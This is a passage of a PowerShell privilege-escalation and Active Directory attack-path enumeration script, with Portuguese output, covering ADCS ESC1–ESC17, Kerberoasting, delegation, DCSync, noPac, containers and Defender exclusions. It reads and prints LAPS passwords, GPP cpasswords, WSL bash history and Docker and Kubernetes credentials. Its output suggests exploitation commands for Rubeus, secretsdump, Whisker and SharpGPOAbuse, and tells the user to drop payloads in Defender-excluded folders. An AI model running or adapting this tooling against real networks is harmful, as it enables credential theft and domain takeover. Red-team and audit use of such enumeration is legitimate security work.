        $caContainer = [ADSI]"LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configNC"
        $cas = @($caContainer.Children)
        if ($cas.Count -eq 0) { W-Ok "Nenhuma CA encontrada"; return }
        $cas | ForEach-Object { W-Info "CA: $($_.Properties['name'][0]) @ $($_.Properties['dNSHostName'][0])" }
    } catch { W-Info "Erro ao enumerar CAs: $_"; return }

    # Templates
    try {
        $configNC     = ([ADSI]"LDAP://RootDSE").configurationNamingContext[0]
        $tplContainer = [ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
        $templates    = @($tplContainer.Children)
    } catch { W-Info "Erro templates: $_"; return }

    W-Sub "ESC1 — ENROLLEE_SUPPLIES_SUBJECT"
    $templates | ForEach-Object {
        $tName = $_.Properties["name"][0]
        $flag  = $_.Properties["msPKI-Certificate-Name-Flag"]
        $eku   = $_.Properties["pKIExtendedKeyUsage"] -join ', '
        if ($flag -and ([int]$flag[0] -band 0x1)) {
            W-Crit "ESC1: '$tName' permite SAN arbitrario | EKU: $eku"
        }
    }

    W-Sub "ESC2 — Any Purpose / sem EKU"
    $templates | ForEach-Object {
        $tName = $_.Properties["name"][0]
        $eku   = @($_.Properties["pKIExtendedKeyUsage"])
        if ($eku -contains "2.5.29.37.0" -or $eku.Count -eq 0) {
            W-High "ESC2: '$tName' Any Purpose EKU"
        }
    }

    W-Sub "ESC3 — Enrollment Agent"
    $templates | ForEach-Object {
        $tName = $_.Properties["name"][0]
        $eku   = @($_.Properties["pKIExtendedKeyUsage"])
        if ($eku -contains "1.3.6.1.4.1.311.20.2.1") {
            W-High "ESC3: '$tName' e Enrollment Agent"
        }
    }

    W-Sub "ESC4 — ACL fraca em template"
    $dangerIds = @("Everyone","Authenticated Users","Domain Users","BUILTIN\Users")
    $templates | ForEach-Object {
        $tpl = $_
        $tpl.ObjectSecurity.Access | Where-Object {
            $dangerIds -contains $_.IdentityReference.Value -and
            $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|WriteProperty"
        } | ForEach-Object {
            W-Crit "ESC4: '$($tpl.Properties['name'][0])' | $($_.IdentityReference) -> $($_.ActiveDirectoryRights)"
        }
    }

    W-Sub "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 na CA"
    $configNC    = ([ADSI]"LDAP://RootDSE").configurationNamingContext[0]
    $caContainer = [ADSI]"LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configNC"
    @($caContainer.Children) | ForEach-Object {
        $caName = $_.Properties["name"][0]
        $eflag  = $_.Properties["msPKI-Enrollment-Flag"]
        if ($eflag -and ([int]$eflag[0] -band 0x40)) {
            W-Crit "ESC6: CA '$caName' tem EDITF_ATTRIBUTESUBJECTALTNAME2"
        }
    }

    W-Sub "ESC7 — ACL fraca na CA"
    @($caContainer.Children) | ForEach-Object {
        $ca = $_
        $ca.ObjectSecurity.Access | Where-Object {
            $dangerIds -contains $_.IdentityReference.Value -and
            $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"
        } | ForEach-Object { W-Crit "ESC7: CA '$($ca.Properties['name'][0])' | $($_.IdentityReference) -> $($_.ActiveDirectoryRights)" }
    }

    W-Sub "ESC8 — Web Enrollment HTTP"
    @($caContainer.Children) | ForEach-Object {
        $h = $_.Properties["dNSHostName"][0]
        if ($h) {
            try {
                $r = Invoke-WebRequest "http://$h/certsrv/" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop
                W-Crit "ESC8: Web Enrollment HTTP em http://$h/certsrv/ — vulneravel a NTLM relay"
            } catch { W-Ok "ESC8: http://$h/certsrv/ nao acessivel" }
        }
    }

    W-Sub "ESC9 — CT_FLAG_NO_SECURITY_EXTENSION (szOID_NTDS_CA_SECURITY_EXT desabilitada no template)"
    try {
        # Busca templates uma unica vez (bug anterior: rodava N vezes dentro do loop de CAs)
        $tplContainer9 = [ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
        $s9 = New-Object System.DirectoryServices.DirectorySearcher $tplContainer9
        $s9.Filter = "(objectClass=pKICertificateTemplate)"
        $s9.PropertiesToLoad.AddRange(@("name","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag"))
        $s9.FindAll() | ForEach-Object {
            $tName = $_.Properties["name"][0]
            $nflag = $_.Properties["msPKI-Certificate-Name-Flag"]
            # CT_FLAG_NO_SECURITY_EXTENSION = 0x80000 (bit 19)
            if ($nflag -and ([int]$nflag[0] -band 0x80000)) {
                W-High "ESC9: template '$tName' tem CT_FLAG_NO_SECURITY_EXTENSION — SID nao embutido no cert"
            }
        }
    } catch { W-Info "ESC9: erro ao enumerar templates: $_" }

    W-Sub "ESC11 — CA sem IF_REQUIRESSL (certreq sobre HTTP sem TLS)"
    @($caContainer.Children) | ForEach-Object {
        $caName   = $_.Properties["name"][0]
        $caFlags  = $_.Properties["flags"]
        # IF_REQUIRESSL = 0x20 — se ausente, certreq pode ser feito sobre HTTP sem TLS
        if ($caFlags -and (([int]$caFlags[0] -band 0x20) -eq 0)) {
            W-High "ESC11: CA '$caName' nao tem IF_REQUIRESSL — relay de certreq HTTP possivel"
        }
    }

    W-Sub "ESC12 — Shell Access via SC_ONLINE_CERTIFICATE_STATUS_PROTOCOL"
    try {
        $ocspReg = "HKLM:\SYSTEM\CurrentControlSet\Services\OcspSvc\Parameters"
        $ocsp    = Get-ItemProperty $ocspReg -ErrorAction Stop
        if ($ocsp) {
            W-Med "ESC12: Servico OCSP configurado — verifique ACL em $ocspReg (WriteDACL pode dar EoP)"
            W-Data "Ferramenta: Certify.exe cas /showSCEP"
        }
    } catch { W-Ok "ESC12: OCSP nao configurado localmente" }

    W-Sub "ESC13 — OID Group Link (issuance policy com privileged group link)"
    try {
        $s = New-Object System.DirectoryServices.DirectorySearcher
        $s.SearchRoot = [ADSI]"LDAP://CN=OID,CN=Public Key Services,CN=Services,$configNC"
        $s.Filter = "(objectClass=msPKI-Enterprise-Oid)"
        $s.PropertiesToLoad.AddRange(@("displayName","msDS-OIDToGroupLink"))
        $s.FindAll() | ForEach-Object {
            $link = $_.Properties["msds-oidtogrouplink"]
            if ($link -and $link.Count -gt 0) {
                W-Crit "ESC13: OID '$($_.Properties['displayname'][0])' linkado ao grupo: $($link[0]) — emitir cert dessa policy = membro do grupo"
            }
        }
    } catch { W-Info "Erro ESC13: $_" }

    W-Sub "ESC15 — szOID_APPLICATION_CERT_POLICIES com EKU privilegiado"
    try {
        $tplContainer = [ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
        $s = New-Object System.DirectoryServices.DirectorySearcher $tplContainer
        $s.Filter = "(objectClass=pKICertificateTemplate)"
        $s.PropertiesToLoad.AddRange(@("name","msPKI-RA-Application-Policies","pKIExtendedKeyUsage"))
        $s.FindAll() | ForEach-Object {
            $tName = $_.Properties["name"][0]
            $raApp = $_.Properties["msPKI-RA-Application-Policies"]
            $eku   = $_.Properties["pKIExtendedKeyUsage"]
            # 1.3.6.1.5.5.7.3.2 = Client Auth EKU
            if ($raApp -and ("$raApp" -match "1\.3\.6\.1\.5\.5\.7\.3\.2") -and $eku -and ("$eku" -match "1\.3\.6\.1\.5\.5\.7\.3\.2")) {
                W-High "ESC15: template '$tName' usa szOID_APPLICATION_CERT_POLICIES com Client Auth — pode permitir SAN arbitrario em versoes antigas"
            }
        }
    } catch { W-Info "Erro ESC15: $_" }

    W-Sub "ESC10 — StrongCertificateBindingEnforcement"
    try {
        $v = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name "StrongCertificateBindingEnforcement" -ErrorAction Stop).StrongCertificateBindingEnforcement
        if ($v -eq 0) { W-High "ESC10: =0 — mapeamento fraco ativo no KDC" }
        else          { W-Ok "ESC10: =$v" }
    } catch { W-Med "ESC10: StrongCertificateBindingEnforcement nao definido (modo compatibilidade)" }

    W-Sub "ESC14 / Shadow Credentials — msDS-KeyCredentialLink"
    W-Info "Use BloodHound para encontrar Write sobre msDS-KeyCredentialLink"
    W-Data "Ferramenta: Whisker.exe add /target:<usuario>"

    W-Sub "ESC16 — szOID_NTDS_CA_SECURITY_EXT desabilitada"
    @($caContainer.Children) | ForEach-Object {
        $caName = $_.Properties["name"][0]
        $rap    = $_.Properties["msPKI-RA-Application-Policies"]
        if ($rap -and ("$rap" -match "1\.3\.6\.1\.4\.1\.311\.25\.2")) {
            W-Crit "ESC16: CA '$caName' desabilitou szOID_NTDS_CA_SECURITY_EXT"
        }
    }

    W-Sub "ESC17 — WSUS HTTP + ADCS"
    try {
        $ws = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "WUServer" -ErrorAction Stop).WUServer
        if ($ws -match "^http://") { W-Crit "ESC17: WSUS HTTP: $ws — MITM + ADCS escalation" }
        elseif ($ws)               { W-Ok  "ESC17: WSUS HTTPS: $ws" }
        else                       { W-Ok  "ESC17: WSUS nao configurado" }
    } catch { W-Ok "ESC17: WSUS nao configurado" }
}

# ─── MODULO: AD ──────────────────────────────────────────────────────────────

function Invoke-ADChecks {
    W-Sec "ACTIVE DIRECTORY — Enumeracao"

    if (-not (Test-Domain)) { W-Info "Nao esta em dominio — AD ignorado"; return }

    $domain   = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $domainDN = "DC=" + ($domain.Name -replace "\.",",DC=")
    W-Info "Dominio: $($domain.Name) | DN: $domainDN"

    function LDAP-Search {
        param([string]$Filter, [string[]]$Props, [int]$PageSize=500)
        $s = New-Object System.DirectoryServices.DirectorySearcher
        $s.SearchRoot = [ADSI]"LDAP://$domainDN"
        $s.Filter     = $Filter
        $s.PageSize   = $PageSize
        if ($Props) { $Props | ForEach-Object { $s.PropertiesToLoad.Add($_) | Out-Null } }
        return $s.FindAll()
    }

    W-Sub "Informacoes do dominio"
    try {
        $dom = [ADSI]"LDAP://$domainDN"
        W-Info "DC Atual     : $($domain.PdcRoleOwner)"
        W-Info "Forest       : $($domain.Forest)"
        W-Info "Nivel func.  : $($domain.DomainModeLevel)"
        $domProps = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -ErrorAction SilentlyContinue
        if ($domProps.SignSecureChannel -eq 0) {
            W-High "SignSecureChannel=0 — LDAP signing pode nao ser obrigatorio (NTLM relay possivel)"
        }
    } catch { W-Info "Erro info dominio: $_" }

    W-Sub "LAPS — leitura de ms-MCS-AdmPwd"
    try {
        $rs = LDAP-Search "(objectCategory=computer)" @("name","ms-MCS-AdmPwd","ms-MCS-AdmPwdExpirationTime")
        $laps = 0; $read = 0
        foreach ($r in $rs) {
            $pwd = $r.Properties["ms-mcs-admpwd"]
            if ($pwd -and $pwd.Count -gt 0 -and $pwd[0] -ne "") {
                $read++
                W-Crit "LAPS: '$($r.Properties['name'][0])' senha legivel: $($pwd[0])"
            } else { $laps++ }
        }
        if ($read -eq 0) { W-Ok "LAPS: $laps PC(s) com LAPS, nenhuma senha legivel" }
    } catch { W-Info "Erro LAPS: $_" }

    W-Sub "gMSA — Group Managed Service Accounts"
    try {
        $rs = LDAP-Search "(objectClass=msDS-GroupManagedServiceAccount)" @("sAMAccountName")
        if ($rs.Count -gt 0) {
            W-Info "$($rs.Count) gMSA(s):"
            foreach ($r in $rs) {
                $n = $r.Properties["samaccountname"][0]
                W-Data $n
                try {
                    $g = Get-ADServiceAccount $n -Properties "msDS-ManagedPassword" -ErrorAction Stop
                    if ($g."msDS-ManagedPassword") { W-Crit "gMSA senha legivel: $n!" }
                } catch {}
            }
        } else { W-Ok "Nenhuma gMSA" }
    } catch { W-Info "Erro gMSA: $_" }

    W-Sub "Kerberoastable — usuarios com SPN"
    try {
        $rs = LDAP-Search "(&(objectCategory=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" @("sAMAccountName","servicePrincipalName","adminCount")
        if ($rs.Count -gt 0) {
            W-High "$($rs.Count) conta(s) Kerberoastable:"
            foreach ($r in $rs) {
                $n = $r.Properties["samaccountname"][0]
                $a = if ($r.Properties["admincount"].Count -gt 0) { $r.Properties["admincount"][0] } else { 0 }
                $s = $r.Properties["serviceprincipalname"] -join " | "
                $sev = if ($a -eq 1) { "CRIT" } else { "HIGH" }
                $msg = "  $n (adminCount=$a) SPNs: $s"
                if ($sev -eq "CRIT") { W-Crit $msg } else { W-High $msg }
            }
            W-Data "Ferramenta: Rubeus.exe kerberoast /nowrap"
        } else { W-Ok "Nenhuma conta Kerberoastable" }
    } catch { W-Info "Erro Kerberoast: $_" }

    W-Sub "AS-REP Roastable — sem pre-autenticacao"
    try {
        $rs = LDAP-Search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" @("sAMAccountName")
        if ($rs.Count -gt 0) {
            W-High "$($rs.Count) conta(s) AS-REP Roastable:"
            $rs | ForEach-Object { W-High "  $($_.Properties['samaccountname'][0])" }
            W-Data "Ferramenta: Rubeus.exe asreproast /nowrap"
        } else { W-Ok "Nenhuma conta AS-REP Roastable" }
    } catch { W-Info "Erro AS-REP: $_" }

    W-Sub "AdminSDHolder — adminCount=1"
    try {
        $rs = LDAP-Search "(&(objectCategory=user)(adminCount=1)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" @("sAMAccountName")
        W-Info "$($rs.Count) conta(s) protegidas pelo AdminSDHolder:"
        $rs | ForEach-Object { W-Data $_.Properties["samaccountname"][0] }
    } catch { W-Info "Erro AdminSDHolder: $_" }

    W-Sub "Contas com senha nao expirante"
    try {
        $rs = LDAP-Search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" @("sAMAccountName")
        if ($rs.Count -gt 0) {
            W-Med "$($rs.Count) conta(s) com senha que nao expira:"
            $rs | Select-Object -First 20 | ForEach-Object { W-Data $_.Properties["samaccountname"][0] }
        }
    } catch { W-Info "Erro contas sem expiracao: $_" }

    W-Sub "GPO Password em SYSVOL (cpassword)"
    try {
        $sysvol = "\\$($domain.Name)\SYSVOL\$($domain.Name)\Policies"
        if (Test-Path $sysvol) {
            Get-ChildItem $sysvol -Recurse -Include "Groups.xml","Services.xml","Scheduledtasks.xml","Printers.xml","Datasources.xml" |
            ForEach-Object {
                $content = Get-Content $_.FullName
                $hits    = $content | Where-Object { $_ -match "cpassword=" -and $_ -notmatch 'cpassword=""' }
                if ($hits) {
                    W-Crit "cpassword (GPP) em $($_.FullName):"
                    $hits | ForEach-Object { W-Data $_ }
                    W-Data "Decriptar: python3 -c `"import base64,hashlib; from Crypto.Cipher import AES; ...`" ou gpp-decrypt"
                }
            }
        }
    } catch { W-Info "Erro SYSVOL: $_" }

    W-Sub "ACLs AD — GenericAll/WriteDACL sobre grupos privilegiados"
    try {
        $me     = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $myIds  = @($me.Name) + @($me.Groups | ForEach-Object { try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch {} })
        $groups = @("Domain Admins","Enterprise Admins","Schema Admins","Administrators","Account Operators","Backup Operators","DNSAdmins")
        foreach ($gn in $groups) {
            $s = New-Object System.DirectoryServices.DirectorySearcher
            $s.SearchRoot = [ADSI]"LDAP://$domainDN"
            $s.Filter = "(&(objectCategory=group)(name=$gn))"
            $r = $s.FindOne()
            if ($r) {
                $ge = $r.GetDirectoryEntry()
                $ge.ObjectSecurity.Access | Where-Object {
                    $myIds -contains $_.IdentityReference.Value -and
                    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"
                } | ForEach-Object { W-Crit "ACL PERIGOSA: conta atual tem '$($_.ActiveDirectoryRights)' sobre '$gn'" }
            }
        }
    } catch { W-Info "Erro ACLs AD: $_" }

    W-Sub "Unconstrained Delegation — TRUSTED_FOR_DELEGATION"
    try {
        # UAC flag 0x80000 = TRUSTED_FOR_DELEGATION
        $rs = LDAP-Search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" @("sAMAccountName","operatingSystem")
        if ($rs.Count -gt 0) {
            W-Crit "Unconstrained Delegation: $($rs.Count) computador(es) — TGTs de qualquer usuario sao cacheados aqui:"
            $rs | ForEach-Object { W-Data "  $($_.Properties['samaccountname'][0]) [$($_.Properties['operatingsystem'][0])]" }
            W-Data "Explorar: Rubeus.exe monitor /interval:5 (enquanto admin se autentica)"
        } else { W-Ok "Nenhum computador com Unconstrained Delegation (exceto DCs)" }
    } catch { W-Info "Erro Unconstrained Delegation: $_" }

    W-Sub "Constrained Delegation — msDS-AllowedToDelegateTo (S4U2Proxy)"
    try {
        $rs = LDAP-Search "(&(|(objectCategory=user)(objectCategory=computer))(msDS-AllowedToDelegateTo=*))" @("sAMAccountName","msDS-AllowedToDelegateTo","userAccountControl")
        if ($rs.Count -gt 0) {
            W-High "Constrained Delegation: $($rs.Count) conta(s):"
            $rs | ForEach-Object {
                $n   = $_.Properties["samaccountname"][0]
                $svs = $_.Properties["msds-allowedtodelegateto"] -join " | "
                # UAC 0x1000000 = TRUSTED_TO_AUTH_FOR_DELEGATION (Protocol Transition)
                $uac = if ($_.Properties["useraccountcontrol"].Count -gt 0) { [int]$_.Properties["useraccountcontrol"][0] } else { 0 }
                $proto = ($uac -band 0x1000000) -ne 0
                if ($proto) { W-Crit "  $n — Protocol Transition (qualquer usuario) -> $svs" }
                else        { W-High "  $n — Kerberos only -> $svs" }
            }
        } else { W-Ok "Nenhuma conta com Constrained Delegation" }
    } catch { W-Info "Erro Constrained Delegation: $_" }

    W-Sub "Resource-Based Constrained Delegation (RBCD)"
    try {
        $rs = LDAP-Search "(&(|(objectCategory=user)(objectCategory=computer))(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" @("sAMAccountName")
        if ($rs.Count -gt 0) {
            W-Crit "RBCD configurado em $($rs.Count) objeto(s) — potencial privesc via S4U2Self:"
            $rs | ForEach-Object { W-Data "  $($_.Properties['samaccountname'][0])" }
            W-Data "Explorar: Rubeus.exe s4u /user:<machine$> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<target>"
        } else { W-Ok "Nenhum objeto com RBCD configurado" }
    } catch { W-Info "Erro RBCD: $_" }

    W-Sub "DCSync — contas com direitos de replicacao"
    try {
        $domainEntry = [ADSI]"LDAP://$domainDN"
        $sd = $domainEntry.ObjectSecurity
        # DS-Replication-Get-Changes-All = {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
        $replGuid = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
        $sd.Access | Where-Object {
            $_.ObjectType -eq $replGuid -and
            $_.IdentityReference.Value -notmatch "SYSTEM|Domain Controllers|Enterprise Domain Controllers|Administrators"
        } | ForEach-Object {
            W-Crit "DCSync: '$($_.IdentityReference)' tem DS-Replication-Get-Changes-All — dump NTDS possivel!"
            W-Data "Ferramenta: impacket-secretsdump -just-dc $($domain.Name)/$($_.IdentityReference)"
        }
    } catch { W-Info "Erro DCSync: $_" }

    W-Sub "GPO — Write access para conta atual"
    try {
        $me    = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $myIds = @($me.Name) + @($me.Groups | ForEach-Object { try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch {} })
        $rs    = LDAP-Search "(objectClass=groupPolicyContainer)" @("displayName","gPCFileSysPath","nTSecurityDescriptor")
        $rs | ForEach-Object {
            $gpoName = $_.Properties["displayname"][0]
            $gpoPath = $_.Properties["gpcfilesyspath"][0]
            try {
                $ge = $_.GetDirectoryEntry()
                $ge.ObjectSecurity.Access | Where-Object {
                    $myIds -contains $_.IdentityReference.Value -and
                    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite|CreateChild"
                } | ForEach-Object {
                    W-Crit "GPO Write: conta atual tem '$($_.ActiveDirectoryRights)' sobre GPO '$gpoName' ($gpoPath)"
                    W-Data "Explorar: SharpGPOAbuse --AddComputerScript/--AddUserScript"
                }
            } catch {}
            # Verificar SYSVOL path
            if ($gpoPath -and (Test-Path $gpoPath) -and (Find-WritablePath $gpoPath)) {
                W-Crit "GPO SYSVOL gravavel: $gpoPath — modificar scripts de startup/logon"
            }
        }
    } catch { W-Info "Erro GPO Write: $_" }

    W-Sub "Trusts de dominio — SIDHistory e transitividade"
    try {
        $trusts = $domain.GetAllTrustRelationships()
        if ($trusts.Count -gt 0) {
            foreach ($t in $trusts) {
                $dir  = $t.TrustDirection
                $type = $t.TrustType
                W-Info "Trust: $($t.TargetName) | Dir: $dir | Tipo: $type"
                if ($type -eq "Forest" -and $dir -match "Bidirectional") {
                    W-High "Forest trust bidirecional com $($t.TargetName) — SIDHistory filtering verificar"
                }
                if ($type -eq "External") {
                    W-Med "Trust externo com $($t.TargetName) — SID filtering ativo por default?"
                }
            }
            # Verificar SIDFiltering desabilitado (quarantine off)
            $rs = LDAP-Search "(&(objectClass=trustedDomain)(!(trustAttributes:1.2.840.113556.1.4.803:=64)))" @("name","trustAttributes","trustDirection")
            $rs | ForEach-Object {
                W-High "Trust '$($_.Properties["name"][0])' sem SID Filtering (quarantine off) — SIDHistory abuse possivel"
            }
        } else { W-Ok "Sem trusts de dominio" }
    } catch { W-Info "Erro Trusts: $_" }

    W-Sub "noPac / Sam-the-Admin — CVE-2021-42278/42287"
    try {
        # Verificar se maquineAccountQuota > 0 (qualquer user pode adicionar computadores)
        $dom = [ADSI]"LDAP://$domainDN"
        $quota = $dom.Properties["ms-DS-MachineAccountQuota"][0]
        if ([int]$quota -gt 0) {
            W-High "ms-DS-MachineAccountQuota=$quota — user comum pode criar contas de maquina (noPac pre-req)"
        }
        # Verificar se schema permite samAccountName == DC sem $
        $rs = LDAP-Search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" @("sAMAccountName","dNSHostName")
        $rs | ForEach-Object {
            $sam = $_.Properties["samaccountname"][0]
            if ($sam -notmatch '\$$') {
                W-Crit "CVE-2021-42278: DC '$sam' sem trailing dollar — sAMAccountName spoofing possivel!"
            }
        }
    } catch { W-Info "Erro noPac check: $_" }
}

# ─── MODULO: CONTAINERS ──────────────────────────────────────────────────────

function Invoke-ContainersChecks {
    W-Sec "CONTAINERS & VIRTUALIZACAO"

    W-Sub "Hyper-V Administrators"
    try {
        $m = Get-LocalGroupMember "Hyper-V Administrators" -ErrorAction Stop
        if ($m) {
            W-High "Hyper-V Administrators tem membros (equivale a admin local via VM worker process):"
            $m | ForEach-Object { W-Data "$($_.Name) [$($_.ObjectClass)]" }
        } else { W-Ok "Hyper-V Administrators: vazio" }
    } catch { W-Info "Erro Hyper-V: $_" }

    W-Sub "Ambiente virtualizado"
    try {
        $bios = Get-CimInstance Win32_BIOS
        $cs   = Get-CimInstance Win32_ComputerSystem
        $str  = "$($bios.SMBIOSBIOSVersion) $($cs.Model) $($cs.Manufacturer)"
        $match = @("VBOX","VMWARE","VIRTUAL","HYPER-V","KVM","XEN","QEMU","BOCHS","INNOTEK") | Where-Object { $str -match $_ }
        if ($match) { W-Info "VM detectada: $($cs.Manufacturer) / $($cs.Model)" }
        else        { W-Ok "Sem indicadores de virtualizacao" }
    } catch {}

    W-Sub "WSL2"
    try {
        $wsl = wsl --list --verbose 2>&1
        if ($LASTEXITCODE -eq 0) {
            W-Med "WSL instalado:"
            $wsl | Where-Object { $_ -match "\S" } | ForEach-Object { W-Data $_ }
            Get-ChildItem "C:\Users\*\AppData\Local\Packages\*CanonicalGroup*\LocalState\rootfs\home" | ForEach-Object {
                W-Med "WSL home: $($_.FullName)"
                if (Test-Path "$($_.FullName)\.ssh") { W-High "SSH keys em home WSL: $($_.FullName)\.ssh" }
                $bh = Get-Content "$($_.FullName)\.bash_history" -TotalCount 200 -ErrorAction SilentlyContinue
                $bh | Where-Object { $_ -match "password|sudo|ssh|token|secret" } |
                Select-Object -First 5 | ForEach-Object { W-High "Bash hist WSL: $_" }
            }
        } else { W-Ok "WSL nao instalado" }
    } catch {}

    W-Sub "Docker Desktop"
    try {
        $dc = Get-Command docker -ErrorAction Stop
        W-Info "Docker: $($dc.Source)"
        $ps = docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Mounts}}" 2>&1
        if ($ps -notmatch "Cannot connect|error") {
            $ps | ForEach-Object { W-Data $_ }
            $ps | Where-Object { $_ -match "C:\\|/c/|/host" } |
            ForEach-Object { W-Crit "Container com volume do host montado: $_" }
        }
        $dcfg = "$env:USERPROFILE\.docker\config.json"
        if (Test-Path $dcfg) {
            $cfg = Get-Content $dcfg | ConvertFrom-Json
            $regs = @($cfg.auths.PSObject.Properties)
            if ($regs.Count -gt 0) {
                W-High "Docker: $($regs.Count) registry credential(s) em $dcfg"
                $regs | ForEach-Object { W-Data $_.Name }
            }
        }
    } catch { W-Ok "Docker nao encontrado" }

    W-Sub "Kubernetes (kubectl)"
    try {
        $kc = Get-Command kubectl -ErrorAction Stop
        W-Info "kubectl: $($kc.Source)"
        $kubeConfig = "$env:USERPROFILE\.kube\config"
        if (Test-Path $kubeConfig) {
            W-High "kubeconfig: $kubeConfig"
            kubectl config get-contexts 2>&1 | ForEach-Object { W-Data $_ }
        }
    } catch { W-Ok "kubectl nao encontrado" }
}

# ─── MODULO: WINDOWS MODERNO ─────────────────────────────────────────────────

function Invoke-ModernChecks {
    W-Sec "WINDOWS MODERNO — Checks Avancados"

    W-Sub "Defender — exclusoes de scan"
    try {
        $p = Get-MpPreference -ErrorAction Stop
        if ($p.ExclusionPath) {
            W-Crit "$($p.ExclusionPath.Count) pasta(s) excluida(s) — dropar payloads aqui:"
            $p.ExclusionPath | ForEach-Object { W-Data $_ }
        } else { W-Ok "Sem exclusoes de pasta no Defender" }
        if ($p.ExclusionProcess) {
            W-High "Processos excluidos: $($p.ExclusionProcess -join ', ')"
        }
        if ($p.ExclusionExtension) {
            W-High "Extensoes excluidas: $($p.ExclusionExtension -join ', ')"
        }
        if ($p.DisableRealtimeMonitoring) { W-Crit "Defender Real-time Protection DESATIVADO!" }
        if ($p.DisableIOAVProtection)     { W-High "Defender IOAV (download scan) desativado" }
    } catch { W-Info "Defender exclusions (requer admin): $_" }

    W-Sub "Token — privileges perigosos"
    $privs = @(
        @{ N="SeImpersonatePrivilege";      S="CRIT"; D="Potato attacks → SYSTEM (PrintSpoofer, GodPotato)" },
        @{ N="SeDebugPrivilege";             S="CRIT"; D="dump LSASS, injecao em processos SYSTEM" },
        @{ N="SeBackupPrivilege";            S="CRIT"; D="dump SAM/SYSTEM/NTDS.dit sem ser admin" },
        @{ N="SeRestorePrivilege";           S="CRIT"; D="sobrescrever qualquer arquivo do sistema" },
        @{ N="SeLoadDriverPrivilege";        S="CRIT"; D="carregar driver malicioso → kernel" },
        @{ N="SeCreateTokenPrivilege";       S="CRIT"; D="criar token com qualquer privilegio" },
        @{ N="SeTcbPrivilege";               S="CRIT"; D="equivalente a SYSTEM" },
        @{ N="SeTakeOwnershipPrivilege";     S="HIGH"; D="tomar posse de arquivos do sistema" },
        @{ N="SeAssignPrimaryTokenPrivilege"; S="HIGH"; D="similar a SeImpersonatePrivilege" },
        @{ N="SeRelabelPrivilege";           S="HIGH"; D="modificar labels de integridade" },
        @{ N="SeEnableDelegationPrivilege";  S="HIGH"; D="configurar delegacao Kerberos irrestrita" },
        @{ N="SeManageVolumePrivilege";      S="HIGH"; D="modificar volumes diretamente (bypass permissions)" }
    )
    $privOut = whoami /priv 2>&1
    foreach ($p in $privs) {
        $line = $privOut | Where-Object { $_ -match $p.N }
        if ($line -and $line -match "Enabled") {
            if ($p.S -eq "CRIT") { W-Crit "$($p.N) ATIVO — $($p.D)" }
            else                  { W-High "$($p.N) ATIVO — $($p.D)" }
        } elseif ($line -and $line -match "Disabled") {
            W-Med "$($p.N) presente mas desabilitado (pode ser reabilitado)"
        }
    }

    W-Sub "WMI Event Subscriptions (backdoors)"
    try {
        $filters   = @(Get-CimInstance -Namespace root/subscription -ClassName __EventFilter   -ErrorAction Stop)
        $consumers = @(Get-CimInstance -Namespace root/subscription -ClassName __EventConsumer  -ErrorAction Stop)
        if ($filters.Count -gt 0 -or $consumers.Count -gt 0) {
            W-Crit "WMI Subscriptions encontradas — backdoor/persistencia detectada!"
            $filters   | ForEach-Object { W-Data "[Filter]   $($_.Name) : $($_.Query)" }
            $consumers | ForEach-Object {
                $cmd = if ($_.CommandLineTemplate) { $_.CommandLineTemplate } else { $_.ScriptText }
                W-Data "[Consumer] $($_.Name) : $cmd"
            }
        } else { W-Ok "Nenhuma WMI Subscription" }
    } catch { W-Info "Erro WMI: $_" }

    W-Sub "AppLocker — regras com paths graváveis"
    try {
        $policy = Get-AppLockerPolicy -Effective -ErrorAction Stop
        $found  = $false
        foreach ($coll in $policy.RuleCollections) {
            foreach ($rule in $coll) {
                if ($rule -is [Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel.FilePathRule]) {
                    $rule.Conditions | ForEach-Object {
                        $p = $_.Path
                        if ($p -match "C:\\Users|C:\\Temp|C:\\Windows\\Temp|C:\\ProgramData") {
                            W-High "AppLocker permite execucao em path gravavel: $p"
                            $found = $true
                        }
                    }
                }
            }
        }
        if (-not $found) { W-Ok "AppLocker sem regras em paths graváveis" }
    } catch { W-Info "AppLocker nao configurado: $_" }

    W-Sub "COM Objects — binarios graváveis (amostra 300)"
    if ($Fast) { W-Info "COM Objects: pulado (-Fast ativo)" }
    else { try {
        if (-not (Test-Path HKCR:)) {
            New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
        }
        $found = $false
        Get-ChildItem "HKCR:\CLSID" | Select-Object -First 300 | ForEach-Object {
